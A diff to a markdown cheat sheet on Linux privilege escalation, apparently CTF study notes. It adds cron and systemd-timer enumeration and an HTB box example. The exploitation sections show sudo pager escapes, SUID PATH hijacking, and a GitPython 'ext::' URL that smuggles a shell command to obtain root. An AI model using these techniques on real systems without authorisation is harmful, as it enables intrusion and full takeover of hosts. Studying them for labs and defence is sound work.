@@ -6,6 +6,7 @@ This is a PrivEsc common library, that gathers all generic techniques (and not s
     - [[Privilege Escalation - Common Library#Who am I? What permissions do I have?|Who am I? What permissions do I have?]]
     - [[Privilege Escalation - Common Library#What is (in) the system? Who else is in the system?|What is (in) the system? Who else is in the system?]]
     - [[Privilege Escalation - Common Library#What is listening? What is running?|What is listening? What is running?]]
+    - [[Privilege Escalation - Common Library#Scheduled tasks (cron & systemd timers)|Scheduled tasks (cron & systemd timers)]]
     - [[Privilege Escalation - Common Library#Extended permission checking|Extended permission checking]]
     - [[Privilege Escalation - Common Library#Sensitive files & credentials|Sensitive files & credentials]]
     - [[Privilege Escalation - Common Library#Capabilities|Capabilities]]
@@ -25,13 +26,13 @@ This is a PrivEsc common library, that gathers all generic techniques (and not s
 
 ### Who am I? What permissions do I have?
 
-| Command   | Description                                                       |
-| --------- | ----------------------------------------------------------------- |
-| `whoami`  | Prints your current username                                      |
-| `id`      | Shows user ID (uid), group ID (gid), and all the groups you're in |
-| `sudo -l` | What can I run as sudo?                                           |
-| `env`     | Shows environment variables — look for credentials, paths, tokens |
-| `groups`  | Shows all groups the current user belongs to.                     |
+|Command|Description|
+|---|---|
+|`whoami`|Prints your current username|
+|`id`|Shows user ID (uid), group ID (gid), and all the groups you're in|
+|`sudo -l`|What can I run as sudo?|
+|`env`|Shows environment variables — look for credentials, paths, tokens|
+|`groups`|Shows all groups the current user belongs to.|
 
 **Writable files hunt:**
 
@@ -47,11 +48,11 @@ Finds regular files writable by the current user, excluding `/proc` and `/sys` (
 
 ### What is (in) the system? Who else is in the system?
 
-| Command               | Description                                                                              |
-| --------------------- | ---------------------------------------------------------------------------------------- |
-| `uname -a`            | Prints system information: kernel version, architecture (x86/x64/ARM)                    |
-| `cat /etc/os-release` | Distribution name and version (Ubuntu, Debian, etc.)                                     |
-| `ls -la /home/`       | Lists all folders (and thus users) in /home. `-l` = long listing (perms etc), `-a` = all |
+|Command|Description|
+|---|---|
+|`uname -a`|Prints system information: kernel version, architecture (x86/x64/ARM)|
+|`cat /etc/os-release`|Distribution name and version (Ubuntu, Debian, etc.)|
+|`ls -la /home/`|Lists all folders (and thus users) in /home. `-l` = long listing (perms etc), `-a` = all|
 
 **Users with a shell:**
 
@@ -82,17 +83,10 @@ Useful for spotting freshly written scripts, configs, or credentials — e.g. a 
 ```bash
 ps aux
 ps aux | grep root      # filter for root-owned processes only
+ps auxf                 # tree view — shows parent/child relationships
 ```
 
-- `a` = show processes from all users, `u` = show the user who owns each process, `x` = include processes not attached to a terminal (background stuff)
-
-**Scheduled tasks:**
-
-```bash
-cat /etc/crontab                           # system-wide crontab
-ls -la /etc/cron*                          # all cron directories (daily, weekly...)
-cat /var/spool/cron/crontabs/* 2>/dev/null # per-user crontabs
-```
+- `a` = show processes from all users, `u` = show the user who owns each process, `x` = include processes not attached to a terminal (background stuff), `f` = forest/tree view
 
 **Open ports & listeners:**
 
@@ -104,6 +98,90 @@ ss -tulpn 2>/dev/null        # modern alternative to netstat, same flags
 Shows listening TCP/UDP ports, program name, and PID. Useful to spot internal services that aren't exposed externally.
 
 - `-t` = TCP, `-u` = UDP, `-l` = listening only, `-p` = show process name/PID, `-n` = numeric (skip DNS resolution, faster)
+
+**Systemd services (running and inactive):**
+
+```bash
+systemctl list-units --type=service --all
+systemctl list-units --type=service --state=running
+
+# Filter for anything custom / interesting
+systemctl list-units --type=service --all | grep -iE 'helix|opc|plant|app|api|<box-keyword>'
+```
+
+**Read a service's unit file** (= the actual `ExecStart` command, the user it runs as, working dir, env):
+
+```bash
+systemctl cat <service>.service
+# better than cat /etc/systemd/system/* because it shows the effective config
+```
+
+What to look for in unit files:
+
+- `User=root` or no `User=` field → runs as root
+- `ExecStart=` → exact binary + args. If you can write to that binary or its directory, it's a hijack.
+- `EnvironmentFile=` → loads variables from a file. If writable, you can inject `LD_PRELOAD` or similar.
+
+---
+
+### Scheduled tasks (cron & systemd timers)
+
+> Scheduled tasks are a goldmine. If a script runs as root every N minutes and you can influence ANY part of its chain (the script, a file it sources, a directory it writes to, a binary it calls), that's privesc-as-a-service.
+
+**Cron (the old way):**
+
+```bash
+cat /etc/crontab                              # system-wide crontab
+ls -la /etc/cron.d/                           # additional crontab snippets (often per-package)
+cat /etc/cron.d/* 2>/dev/null
+
+ls -la /etc/cron.hourly/                      # scripts run hourly
+ls -la /etc/cron.daily/                       # scripts run daily
+ls -la /etc/cron.weekly/                      # scripts run weekly
+ls -la /etc/cron.monthly/                     # scripts run monthly
+
+cat /var/spool/cron/crontabs/* 2>/dev/null    # per-user crontabs (needs root to read all)
+crontab -l                                    # your own crontab
+```
+
+For each script in `/etc/cron.*/`, check:
+
+- Is the script itself writable by you?
+- Is its parent directory writable by you?
+- Does it source/include another file that's writable?
+- Does it call binaries by name (PATH-hijackable)?
+
+**Systemd timers (the modern way, increasingly common):**
+
+```bash
+systemctl list-timers --all
+```
+
+Output columns: `NEXT` (when it runs next), `LEFT` (countdown), `LAST`, `PASSED`, `UNIT` (the timer), `ACTIVATES` (the service it triggers).
+
+For each interesting timer, read its definition AND the service it triggers:
+
+```bash
+systemctl cat <timer-name>.timer       # when it runs
+systemctl cat <service-name>.service   # what it actually does
+```
+
+Then go hunt the `ExecStart` binary/script the same way — readable? Writable? Calls things by name?
+
+**Spotting a watchdog / cleanup job:**
+
+A timer that runs every few minutes (especially short intervals like 1-5 min) is often a state reset / cleanup job that will undo your changes. The HTB pattern is: enumerate timers → identify the watchdog → either race it or find what triggers/bypasses it.
+
+```bash
+# At a glance, what runs frequently
+systemctl list-timers --all | awk 'NR==1 || $2 ~ /min/ || $2 ~ /s$/'
+```
+
+**Real example ([[Helix]]):**
+
+- `systemctl list-timers --all` → `helix-cleanup.timer` runs every 5 min
+- `systemctl cat helix-cleanup.service` → calls `/usr/local/sbin/helix-cleanup.sh` as root (oneshot)
+- This was the process reverting my OPC UA writes; identifying it via timer enum is what cracked the box
 
 ---
 
@@ -211,12 +289,15 @@ Lists all binaries with special Linux capabilities set.
 Cross-reference findings on [GTFOBins](https://gtfobins.github.io/) under the _Capabilities_ filter.
 
 ---
+
 ## Exploitation
 
 > You found something. Here's how to abuse it.
 
 ---
+
 ### Sudo pager escape
+
 > A pager is a program that displays long output one screen at a time, letting you scroll through it — think of it as a "reader" for terminal output. The most common one is `less`. The dangerous thing about pagers is that `less` lets you run shell commands from inside it by typing `!command`.
 
 If `sudo -l` shows you can run any of these as sudo, you can escape into a root shell:
@@ -255,15 +336,18 @@ whoami  # root
 ```
 
 ---
+
 ### PATH hijack (SUID binary)
 
 > If a SUID binary calls another program by name (not full path), you can create a malicious binary with that name earlier in PATH and make the SUID binary execute it as root instead.
 
 **Conditions needed:**
+
 - A SUID binary that calls a program by name without full path
 - A writable directory you can prepend to PATH
 
 **Steps:**
+
 1. Identify the SUID binary and what it calls (use `strings` or `ltrace`)
 2. Create a malicious binary with that name in a writable directory
 3. Prepend that directory to PATH
@@ -304,11 +388,13 @@ whoami  # root
 > If you can run a script as sudo that uses GitPython's `clone_from()` with `protocol.ext.allow=always`, you can pass an `ext::` URL to make git execute an arbitrary command as root before the clone fails.
 
 **Conditions needed:**
+
 - Sudo rights to a script that calls `git clone` or GitPython's `clone_from()`
 - The script passes `-c protocol.ext.allow=always`
 - User input goes directly into the URL with no sanitization
 
 **Steps:**
+
 1. Write your payload to a script:
 
 ```bash
@@ -317,11 +403,13 @@ chmod +x /tmp/pwn.sh
 ```
 
 2. Pass it as an `ext::` URL:
+
 ```bash
 sudo /path/to/script.py 'ext::sh -c /tmp/pwn.sh'
 ```
 
 3. Git runs your script as root, errors out (expected), then:
+
 ```bash
 /bin/bash -p
 whoami  # root
